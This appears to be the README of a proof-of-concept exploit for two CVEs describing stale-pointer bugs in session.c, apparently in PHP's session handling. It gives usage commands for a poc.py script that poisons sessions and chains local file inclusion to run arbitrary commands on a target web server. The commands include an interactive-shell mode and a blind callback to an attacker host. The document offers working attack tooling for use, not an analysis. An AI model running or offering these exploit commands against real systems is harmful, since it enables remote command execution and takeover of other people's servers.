CVE-2026-109618 — post_bytes_processed stale pointer (session.c:3292)

CVE-2026-109619 — current_file_bytes_processed stale pointer (session.c:3318)

Usage
```
python3 poc.py <url> <command> [OPTIONS]

# Session poison + auto-detected LFI
python3 poc.py http://target.example.com/index.php "id"

# Specify LFI parameter
python3 poc.py http://target.example.com/ "id" --lfi-param page

# Interactive shell
python3 poc.py http://target.example.com/ "id" -i

# Blind callback (no LFI needed on target side)
python3 poc.py http://target.example.com/ "id" --callback http://attacker.com/
```

Writeup coming soon. Credit to Syrex1013
